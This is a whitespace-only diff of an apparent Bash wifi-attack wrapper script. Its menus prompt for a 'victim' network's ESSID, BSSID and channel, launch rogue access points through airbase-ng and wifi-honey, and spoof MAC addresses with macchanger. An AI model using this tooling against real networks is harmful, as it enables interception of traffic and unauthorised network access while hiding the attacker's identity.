@@ -1952,270 +1965,269 @@ menuMain
 
 menuSessionSave(){
 
-# Not needed for this menu
-currentTask="menuSessionSave"
-#lastMenuID="menuSessionSave"
+	# Not needed for this menu
+	currentTask="menuSessionSave"
+	#lastMenuID="menuSessionSave"
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo "Session Save Menu"
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
-echo "Save As: "$capturePath/$encryptionType/$encryptionType.sessions""
-echo ""
-echo ""
-echo ""
-echo "Press "\""S"\" "and ENTER to save session file now"
-echo ""
-echo ""
-echo "You may also just press ENTER to return to the previous menu...."
-echo ""
-echo ""
+	echo "Session Save Menu"
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo "Save As: "$capturePath/$encryptionType/$encryptionType.sessions""
+	echo ""
+	echo ""
+	echo ""
+	echo "Press "\""S"\" "and ENTER to save session file now"
+	echo ""
+	echo ""
+	echo "You may also just press ENTER to return to the previous menu...."
+	echo ""
+	echo ""
 
-getSession="S"
-#read getSession
+	getSession="S"
+	#read getSession
 
-case "$getSession" in
+	case "$getSession" in
 
-"")
-$lastMenuID
-;;
+	"")
+	$lastMenuID
+	;;
 
-"M" | "m")
-menuMain
-;;
+	"M" | "m")
+	menuMain
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
+	;;
 
-"S" | "s")
-sessionSave
-;;
+	"S" | "s")
+	sessionSave
+	;;
 
-"L" | "l")
-menuSessionLoad
-;;
+	"L" | "l")
+	menuSessionLoad
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-*)
-$lastMenuID
-;;
+	*)
+	$lastMenuID
+	;;
 
-esac
+	esac
 
-$lastMenuID
+	$lastMenuID
 
 }
 
 
 menuSessionLoad(){
 
-# Not needed for this menu
-currentTask="menuSessionLoad"
-#lastMenuID="menuSessionLoad"
+	# Not needed for this menu
+	currentTask="menuSessionLoad"
+	#lastMenuID="menuSessionLoad"
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo "Session Load Menu"
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
-echo "Current File Loaded: $capturePath/$encryptionType/$encryptionType.sessions"
-echo ""
-echo ""
-echo ""
-echo "Press "\""L"\" "and ENTER to load session file now"
-echo ""
-echo ""
-echo "You may also just press ENTER to return to the previous menu...."
-echo ""
-echo ""
+	echo "Session Load Menu"
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo "Current File Loaded: $capturePath/$encryptionType/$encryptionType.sessions"
+	echo ""
+	echo ""
+	echo ""
+	echo "Press "\""L"\" "and ENTER to load session file now"
+	echo ""
+	echo ""
+	echo "You may also just press ENTER to return to the previous menu...."
+	echo ""
+	echo ""
 
-getSession="L"
-#read getSession
+	getSession="L"
+	#read getSession
 
-case "$getSession" in
+	case "$getSession" in
 
-"")
-$lastMenuID
-;;
+	"")
+	$lastMenuID
+	;;
 
-"M" | "m")
-menuMain
-;;
+	"M" | "m")
+	menuMain
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
+	;;
 
-"S" | "s")
-menuSessionSave
-;;
+	"S" | "s")
+	menuSessionSave
+	;;
 
-"L" | "l")
-sessionLoad
-;;
+	"L" | "l")
+	sessionLoad
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-*)
-$lastMenuID
-;;
+	*)
+	$lastMenuID
+	;;
 
-esac
+	esac
 
-$lastMenuID
+	$lastMenuID
 
 }
 
 
 menuHoneyPotMode(){
 
-currentTask="menuHoneyPotMode"
+	currentTask="menuHoneyPotMode"
 
-initMonitorMode
+	initMonitorMode
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo ""
-echo "I Am HoneyPot Mode"
-echo ""
-echo "I Am Also Broken :("
-echo ""
-echo ""
-echo ""
-echo "1) Use Airbase-ng"
-echo ""
-echo "2) Use Wifi-Honey"
-echo ""
-echo "3) Use a Custom Binary"
-echo ""
-echo ""
-echo ""
-echo "Select an option and press ENTER:"
-echo ""
-echo ""
+	echo ""
+	echo "I Am HoneyPot Mode"
+	echo ""
+	echo "I Am Also Broken :("
+	echo ""
+	echo ""
+	echo ""
+	echo "1) Use Airbase-ng"
+	echo ""
+	echo "2) Use Wifi-Honey"
+	echo ""
+	echo "3) Use a Custom Binary"
+	echo ""
+	echo ""
+	echo ""
+	echo "Select an option and press ENTER:"
+	echo ""
+	echo ""
 
-read getHoneyPotOptionMain
+	read getHoneyPotOptionMain
 
-case "$getHoneyPotOptionMain" in
+	case "$getHoneyPotOptionMain" in
 
-"")
-menuHoneyPotMode
-#$lastMenuID
-#menuMain
-#menuAdvanced
-;;
+	"")
+	menuHoneyPotMode
+	#$lastMenuID
+	#menuMain
+	#menuAdvanced
+	;;
 
-"1")
-getBSSID
-$terminal airbase-ng -a $bssid -i $interfaceMonitor -h $macAddressMonitor -v &
-;;
+	"1")
+	getBSSID
+	$terminal airbase-ng -a $bssid -i $interfaceMonitor -h $macAddressMonitor -v &
+	;;
 
-"2")
-getESSID
-getChannel
-$terminal wifi-honey $essid $channel $interfaceMonitor &
-;;
+	"2")
+	getESSID
+	getChannel
+	$terminal wifi-honey $essid $channel $interfaceMonitor &
+	;;
 
-"3")
-echo "Custom Binary"
-read pause
-menuHoneyPotMode
-;;
+	"3")
+	echo "Custom Binary"
+	read pause
+	menuHoneyPotMode
+	;;
 
-"M" | "m")
-killAll
-stopMonitorMode
-menuMain
-;;
+	"M" | "m")
+	killAll
+	stopMonitorMode
+	menuMain
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
+	;;
 
-"S" | "s")
-menuSessionSave
-;;
+	"S" | "s")
+	menuSessionSave
+	;;
 
-"L" | "l")
-menuSessionLoad
-;;
+	"L" | "l")
+	menuSessionLoad
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-*)
-menuHoneyPotMode
-#$lastMenuID
-#menuMain
-#menuAdvanced
-;;
+	*)
+	menuHoneyPotMode
+	#$lastMenuID
+	#menuMain
+	#menuAdvanced
+	;;
 
-esac
+	esac
 
-#restartProcesses
+	#restartProcesses
 
-menuHoneyPotMode
-#$lastMenuID
-
+	menuHoneyPotMode
+	#$lastMenuID
 
 }
 
@@ -2235,373 +2247,373 @@ menuHoneyPotMode
 
 getESSID(){
 
-currentTask="getESSID"
+	currentTask="getESSID"
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo ""
+	echo ""
 
-case "$encryptionTypeText" in
-"WPS")
-echo "THERE SHOULD NOW BE TWO (2) TERMINAL WINDOWS OPEN"
-echo ""
-echo "YOU CAN USE THE AIRODUMP WINDOW (ALL WHITE TEXT) TO GATHER ALL NEEDED INFORMATION"
-echo ""
-echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
-echo ""
-echo "THE WIFITE WINDOW (WITH GREEN TEXT) WILL HELP YOU TO DETERMINE WHICH TARGETS SUPPORT WPS"
-echo ""
-echo "NOTE: YOU MAY HAVE TO MOVE ONE OF THE WINDOWS IF THEY ARE STACKED YOU MAY NOT SEE BOTH"
-echo ""
-echo ""
-echo ""
-;;
-esac
+	case "$encryptionTypeText" in
+	"WPS")
+	echo "THERE SHOULD NOW BE TWO (2) TERMINAL WINDOWS OPEN"
+	echo ""
+	echo "YOU CAN USE THE AIRODUMP WINDOW (ALL WHITE TEXT) TO GATHER ALL NEEDED INFORMATION"
+	echo ""
+	echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
+	echo ""
+	echo "THE WIFITE WINDOW (WITH GREEN TEXT) WILL HELP YOU TO DETERMINE WHICH TARGETS SUPPORT WPS"
+	echo ""
+	echo "NOTE: YOU MAY HAVE TO MOVE ONE OF THE WINDOWS IF THEY ARE STACKED YOU MAY NOT SEE BOTH"
+	echo ""
+	echo ""
+	echo ""
+	;;
+	esac
 
-case "$encryptionTypeText" in
-"WEP")
-echo "THERE SHOULD NOW BE A NEW TERMINAL WINDOW OPEN"
-echo ""
-echo "YOU CAN USE THE AIRODUMP WINDOW TO GATHER ALL NEEDED INFORMATION"
-echo ""
-echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
-echo ""
-echo ""
-echo ""
-;;
-esac
+	case "$encryptionTypeText" in
+	"WEP")
+	echo "THERE SHOULD NOW BE A NEW TERMINAL WINDOW OPEN"
+	echo ""
+	echo "YOU CAN USE THE AIRODUMP WINDOW TO GATHER ALL NEEDED INFORMATION"
+	echo ""
+	echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
+	echo ""
+	echo ""
+	echo ""
+	;;
+	esac
 
-case "$encryptionTypeText" in
-"WPA")
-echo "THERE SHOULD NOW BE A NEW TERMINAL WINDOW OPEN"
-echo ""
-echo "YOU CAN USE THE AIRODUMP WINDOW TO GATHER ALL NEEDED INFORMATION"
-echo ""
-echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
-echo ""
-echo ""
-echo ""
-;;
-esac
+	case "$encryptionTypeText" in
+	"WPA")
+	echo "THERE SHOULD NOW BE A NEW TERMINAL WINDOW OPEN"
+	echo ""
+	echo "YOU CAN USE THE AIRODUMP WINDOW TO GATHER ALL NEEDED INFORMATION"
+	echo ""
+	echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
+	echo ""
+	echo ""
+	echo ""
+	;;
+	esac
 
-case "$encryptionTypeText" in
-"WPA2")
-echo "THERE SHOULD NOW BE A NEW TERMINAL WINDOW OPEN"
-echo ""
-echo "YOU CAN USE THE AIRODUMP WINDOW TO GATHER ALL NEEDED INFORMATION"
-echo ""
-echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
-echo ""
-echo ""
-echo ""
-;;
-esac
+	case "$encryptionTypeText" in
+	"WPA2")
+	echo "THERE SHOULD NOW BE A NEW TERMINAL WINDOW OPEN"
+	echo ""
+	echo "YOU CAN USE THE AIRODUMP WINDOW TO GATHER ALL NEEDED INFORMATION"
+	echo ""
+	echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
+	echo ""
+	echo ""
+	echo ""
+	;;
+	esac
 
-echo "PASTE or type the Victim ESSID Here and press ENTER:"
-echo ""
-echo "Example: NETGEAR"
-echo ""
-echo ""
+	echo "PASTE or type the Victim ESSID Here and press ENTER:"
+	echo ""
+	echo "Example: NETGEAR"
+	echo ""
+	echo ""
 
-read getESSIDTemp
+	read getESSIDTemp
 
-case "$getESSIDTemp" in
+	case "$getESSIDTemp" in
 
-"")
-getESSID
-;;
+	"")
+	getESSID
+	;;
 
-"M" | "m")
-killAll
-stopMonitorMode
-menuMain
-;;
+	"M" | "m")
+	killAll
+	stopMonitorMode
+	menuMain
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
+	;;
 
-"S" | "s")
-menuSessionSave
-;;
+	"S" | "s")
+	menuSessionSave
+	;;
 
-"L" | "l")
-menuSessionLoad
-;;
+	"L" | "l")
+	menuSessionLoad
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-*)
-essid="$getESSIDTemp"
-;;
+	*)
+	essid="$getESSIDTemp"
+	;;
 
-esac
+	esac
 
 }
 
 
 getBSSID(){
 
-currentTask="getBSSID"
+	currentTask="getBSSID"
 
-banner
+	banner
 
-bannerStats
+	bannerStats
 
-echo ""
+	echo ""
 
-case "$encryptionTypeText" in
-"WPS")
-echo "THERE SHOULD NOW BE TWO (2) TERMINAL WINDOWS OPEN"
-echo ""
-echo "YOU CAN USE THE AIRODUMP WINDOW (ALL WHITE TEXT) TO GATHER ALL NEEDED INFORMATION"
-echo ""
-echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
-echo ""
-echo "THE WIFITE WINDOW (WITH GREEN TEXT) WILL HELP YOU TO DETERMINE WHICH TARGETS SUPPORT WPS"
-echo ""
-echo "NOTE: YOU MAY HAVE TO MOVE ONE OF THE WINDOWS IF THEY ARE STACKED YOU MAY NOT SEE BOTH"
-echo ""
-echo ""
-echo ""
-;;
-esac
+	case "$encryptionTypeText" in
+	"WPS")
+	echo "THERE SHOULD NOW BE TWO (2) TERMINAL WINDOWS OPEN"
+	echo ""
+	echo "YOU CAN USE THE AIRODUMP WINDOW (ALL WHITE TEXT) TO GATHER ALL NEEDED INFORMATION"
+	echo ""
+	echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
+	echo ""
+	echo "THE WIFITE WINDOW (WITH GREEN TEXT) WILL HELP YOU TO DETERMINE WHICH TARGETS SUPPORT WPS"
+	echo ""
+	echo "NOTE: YOU MAY HAVE TO MOVE ONE OF THE WINDOWS IF THEY ARE STACKED YOU MAY NOT SEE BOTH"
+	echo ""
+	echo ""
+	echo ""
+	;;
+	esac
 
-case "$encryptionTypeText" in
-"WEP")
-echo "THERE SHOULD NOW BE A NEW TERMINAL WINDOW OPEN"
-echo ""
-echo "YOU CAN USE THE AIRODUMP WINDOW TO GATHER ALL NEEDED INFORMATION"
-echo ""
-echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
-echo ""
-echo ""
-echo ""
-;;
-esac
+	case "$encryptionTypeText" in
+	"WEP")
+	echo "THERE SHOULD NOW BE A NEW TERMINAL WINDOW OPEN"
+	echo ""
+	echo "YOU CAN USE THE AIRODUMP WINDOW TO GATHER ALL NEEDED INFORMATION"
+	echo ""
+	echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
+	echo ""
+	echo ""
+	echo ""
+	;;
+	esac
 
-case "$encryptionTypeText" in
-"WPA")
-echo "THERE SHOULD NOW BE A NEW TERMINAL WINDOW OPEN"
-echo ""
-echo "YOU CAN USE THE AIRODUMP WINDOW TO GATHER ALL NEEDED INFORMATION"
-echo ""
-echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
-echo ""
-echo ""
-echo ""
-;;
-esac
+	case "$encryptionTypeText" in
+	"WPA")
+	echo "THERE SHOULD NOW BE A NEW TERMINAL WINDOW OPEN"
+	echo ""
+	echo "YOU CAN USE THE AIRODUMP WINDOW TO GATHER ALL NEEDED INFORMATION"
+	echo ""
+	echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
+	echo ""
+	echo ""
+	echo ""
+	;;
+	esac
 
-case "$encryptionTypeText" in
-"WPA2")
-echo "THERE SHOULD NOW BE A NEW TERMINAL WINDOW OPEN"
-echo ""
-echo "YOU CAN USE THE AIRODUMP WINDOW TO GATHER ALL NEEDED INFORMATION"
-echo ""
-echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
-echo ""
-echo ""
-echo ""
-;;
-esac
+	case "$encryptionTypeText" in
+	"WPA2")
+	echo "THERE SHOULD NOW BE A NEW TERMINAL WINDOW OPEN"
+	echo ""
+	echo "YOU CAN USE THE AIRODUMP WINDOW TO GATHER ALL NEEDED INFORMATION"
+	echo ""
+	echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
+	echo ""
+	echo ""
+	echo ""
+	;;
+	esac
 
-echo "PASTE or type the Victim BSSID Here and press ENTER:"
-echo ""
-echo "Example: A1:B2:C3:D4:E5:F6"
-echo ""
-echo ""
+	echo "PASTE or type the Victim BSSID Here and press ENTER:"
+	echo ""
+	echo "Example: A1:B2:C3:D4:E5:F6"
+	echo ""
+	echo ""
 
-read getBSSIDTemp
+	read getBSSIDTemp
 
-case "$getBSSIDTemp" in
+	case "$getBSSIDTemp" in
 
-"")
-getBSSID
-;;
+	"")
+	getBSSID
+	;;
 
-"M" | "m")
-killAll
-stopMonitorMode
-menuMain
-;;
+	"M" | "m")
+	killAll
+	stopMonitorMode
+	menuMain
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
+	;;
 
-"S" | "s")
-menuSessionSave
-;;
+	"S" | "s")
+	menuSessionSave
+	;;
 
-"L" | "l")
-menuSessionLoad
-;;
+	"L" | "l")
+	menuSessionLoad
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-*)
-bssid="$getBSSIDTemp"
-;;
+	*)
+	bssid="$getBSSIDTemp"
+	;;
 
-esac
+	esac
 
 }
 
 
 getChannel(){
 
-currentTask="getChannel"
+	currentTask="getChannel"
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo ""
+	echo ""
 
-case "$encryptionTypeText" in
-"WPS")
-echo "THERE SHOULD NOW BE TWO (2) TERMINAL WINDOWS OPEN"
-echo ""
-echo "YOU CAN USE THE AIRODUMP WINDOW (ALL WHITE TEXT) TO GATHER ALL NEEDED INFORMATION"
-echo ""
-echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
-echo ""
-echo "THE WIFITE WINDOW (WITH GREEN TEXT) WILL HELP YOU TO DETERMINE WHICH TARGETS SUPPORT WPS"
-echo ""
-echo "NOTE: YOU MAY HAVE TO MOVE ONE OF THE WINDOWS IF THEY ARE STACKED YOU MAY NOT SEE BOTH"
-echo ""
-echo ""
-echo ""
-;;
-esac
+	case "$encryptionTypeText" in
+	"WPS")
+	echo "THERE SHOULD NOW BE TWO (2) TERMINAL WINDOWS OPEN"
+	echo ""
+	echo "YOU CAN USE THE AIRODUMP WINDOW (ALL WHITE TEXT) TO GATHER ALL NEEDED INFORMATION"
+	echo ""
+	echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
+	echo ""
+	echo "THE WIFITE WINDOW (WITH GREEN TEXT) WILL HELP YOU TO DETERMINE WHICH TARGETS SUPPORT WPS"
+	echo ""
+	echo "NOTE: YOU MAY HAVE TO MOVE ONE OF THE WINDOWS IF THEY ARE STACKED YOU MAY NOT SEE BOTH"
+	echo ""
+	echo ""
+	echo ""
+	;;
+	esac
 
-case "$encryptionTypeText" in
-"WEP")
-echo "THERE SHOULD NOW BE A NEW TERMINAL WINDOW OPEN"
-echo ""
-echo "YOU CAN USE THE AIRODUMP WINDOW TO GATHER ALL NEEDED INFORMATION"
-echo ""
-echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
-echo ""
-echo ""
-echo ""
-;;
-esac
+	case "$encryptionTypeText" in
+	"WEP")
+	echo "THERE SHOULD NOW BE A NEW TERMINAL WINDOW OPEN"
+	echo ""
+	echo "YOU CAN USE THE AIRODUMP WINDOW TO GATHER ALL NEEDED INFORMATION"
+	echo ""
+	echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
+	echo ""
+	echo ""
+	echo ""
+	;;
+	esac
 
-case "$encryptionTypeText" in
-"WPA")
-echo "THERE SHOULD NOW BE A NEW TERMINAL WINDOW OPEN"
-echo ""
-echo "YOU CAN USE THE AIRODUMP WINDOW TO GATHER ALL NEEDED INFORMATION"
-echo ""
-echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
-echo ""
-echo ""
-echo ""
-;;
-esac
+	case "$encryptionTypeText" in
+	"WPA")
+	echo "THERE SHOULD NOW BE A NEW TERMINAL WINDOW OPEN"
+	echo ""
+	echo "YOU CAN USE THE AIRODUMP WINDOW TO GATHER ALL NEEDED INFORMATION"
+	echo ""
+	echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
+	echo ""
+	echo ""
+	echo ""
+	;;
+	esac
 
-case "$encryptionTypeText" in
-"WPA2")
-echo "THERE SHOULD NOW BE A NEW TERMINAL WINDOW OPEN"
-echo ""
-echo "YOU CAN USE THE AIRODUMP WINDOW TO GATHER ALL NEEDED INFORMATION"
-echo ""
-echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
-echo ""
-echo ""
-echo ""
-;;
-esac
+	case "$encryptionTypeText" in
+	"WPA2")
+	echo "THERE SHOULD NOW BE A NEW TERMINAL WINDOW OPEN"
+	echo ""
+	echo "YOU CAN USE THE AIRODUMP WINDOW TO GATHER ALL NEEDED INFORMATION"
+	echo ""
+	echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
+	echo ""
+	echo ""
+	echo ""
+	;;
+	esac
 
-echo "Enter the Victim CHANNEL and press ENTER:"
-echo ""
-echo "Example: 6"
-echo ""
-echo ""
+	echo "Enter the Victim CHANNEL and press ENTER:"
+	echo ""
+	echo "Example: 6"
+	echo ""
+	echo ""
 
-read getChannelTemp
+	read getChannelTemp
 
-case "$getChannelTemp" in
+	case "$getChannelTemp" in
 
-"")
-getChannel
-;;
+	"")
+	getChannel
+	;;
 
-"M" | "m")
-killAll
-stopMonitorMode
-menuMain
-;;
+	"M" | "m")
+	killAll
+	stopMonitorMode
+	menuMain
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
+	;;
 
-"S" | "s")
-menuSessionSave
-;;
+	"S" | "s")
+	menuSessionSave
+	;;
 
-"L" | "l")
-menuSessionLoad
-;;
+	"L" | "l")
+	menuSessionLoad
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-*)
-channel="$getChannelTemp"
-;;
+	*)
+	channel="$getChannelTemp"
+	;;
 
-esac
+	esac
 
 }
 
@@ -2621,177 +2633,177 @@ esac
 
 getMacAddress(){
 
-currentTask="getMacAddress"
+	currentTask="getMacAddress"
 
-macAddress=$(ip link show $interface | tail -n 1 |  cut -f 6 -d " ")
+	macAddress=$(ip link show $interface | tail -n 1 |  cut -f 6 -d " ")
 
 }
 
 
 getMacAddressMonitor(){
 
-currentTask="getMacAddressMonitor"
+	currentTask="getMacAddressMonitor"
 
-macAddressMonitor=$(ip link show $interfaceMonitor | tail -n 1 |  cut -f 6 -d " ")
+	macAddressMonitor=$(ip link show $interfaceMonitor | tail -n 1 |  cut -f 6 -d " ")
 
 }
 
 
 setMacAddress(){
 
-currentTask="setMacAddress"
+	currentTask="setMacAddress"
 
-ifconfig $interface down
-macchanger -m $getNewMacAdressTemp $interface
-ifconfig $interface up
+	ifconfig $interface down
+	macchanger -m $getNewMacAdressTemp $interface
+	ifconfig $interface up
 
-spoofStatus="1"
+	spoofStatus="1"
 
-macAddress="$getNewMacAdressTemp"
+	macAddress="$getNewMacAdressTemp"
 
 }
 
 
 setMacAddressMonitor(){
 
-currentTask="setMacAddressMonitor"
+	currentTask="setMacAddressMonitor"
 
-ifconfig $interfaceMonitor down
-macchanger -m $getNewMacAdressTemp $interfaceMonitor
-ifconfig $interfaceMonitor up
+	ifconfig $interfaceMonitor down
+	macchanger -m $getNewMacAdressTemp $interfaceMonitor
+	ifconfig $interfaceMonitor up
 
-spoofStatus="1"
+	spoofStatus="1"
 
-macAddressMonitor="$getNewMacAdressTemp"
+	macAddressMonitor="$getNewMacAdressTemp"
 
 }
 
 
 getRandomMacAddress(){
 
-currentTask="getRandomMacAddress"
+	currentTask="getRandomMacAddress"
 
-ifconfig $interface down
-macchanger -r $interface
-ifconfig $interface up
+	ifconfig $interface down
+	macchanger -r $interface
+	ifconfig $interface up
 
-spoofStatus="1"
+	spoofStatus="1"
 
-getMacAddress
+	getMacAddress
 
-#macAddress="$getNewMacAdressTemp"
+	#macAddress="$getNewMacAdressTemp"
 
 }
 
 
 getRandomMacAddressMonitor(){
 
-currentTask="getRandomMacAddressMonitor"
+	currentTask="getRandomMacAddressMonitor"
 
-ifconfig $interfaceMonitor down
-macchanger -r $interfaceMonitor
-ifconfig $interfaceMonitor up
+	ifconfig $interfaceMonitor down
+	macchanger -r $interfaceMonitor
+	ifconfig $interfaceMonitor up
 
-spoofStatus="1"
+	spoofStatus="1"
 
-getMacAddressMonitor
+	getMacAddressMonitor
 
-#macAddressMonitor="$getNewMacAdressTemp"
+	#macAddressMonitor="$getNewMacAdressTemp"
 
 }
 
 
 spoofMacAddress(){
 
-currentTask="spoofMacAddress"
-#lastMenuID="spoofMacAddress"
+	currentTask="spoofMacAddress"
+	#lastMenuID="spoofMacAddress"
 
-banner
+	banner
 
-bannerStats
+	bannerStats
 
-echo ""
-echo "To choose a random MAC Address, press the "\"R"\" key and press ENTER"
-echo ""
-echo ""
-echo "Enter the New MAC Address and press ENTER:"
-echo ""
-echo "Example: 00:11:22:33:44:55"
-echo ""
-echo ""
+	echo ""
+	echo "To choose a random MAC Address, press the "\"R"\" key and press ENTER"
+	echo ""
+	echo ""
+	echo "Enter the New MAC Address and press ENTER:"
+	echo ""
+	echo "Example: 00:11:22:33:44:55"
+	echo ""
+	echo ""
 
-read getNewMacAdressTemp
+	read getNewMacAdressTemp
 
-case "$getNewMacAdressTemp" in
+	case "$getNewMacAdressTemp" in
 
-"")
-spoofMacAddress
-;;
+	"")
+	spoofMacAddress
+	;;
 
-"R" | "r")
-getRandomMacAddress
-getRandomMacAddressMonitor
-$lastMenuID
-;;
+	"R" | "r")
+	getRandomMacAddress
+	getRandomMacAddressMonitor
+	$lastMenuID
+	;;
 
-"M" | "m")
-spoofStatus="0"
-killAll
-stopMonitorMode
-menuMain
-;;
+	"M" | "m")
+	spoofStatus="0"
+	killAll
+	stopMonitorMode
+	menuMain
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
+	;;
 
-"S" | "s")
-menuSessionSave
-;;
+	"S" | "s")
+	menuSessionSave
+	;;
 
-"L" | "l")
-menuSessionLoad
-;;
+	"L" | "l")
+	menuSessionLoad
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-*)
-setMacAddress
-setMacAddressMonitor
-$lastMenuID
-;;
+	*)
+	setMacAddress
+	setMacAddressMonitor
+	$lastMenuID
+	;;
 
-esac
+	esac
 
 }
 
 
 checkSpoofStatus(){
 
-case "$spoofStatus" in
+	case "$spoofStatus" in
 
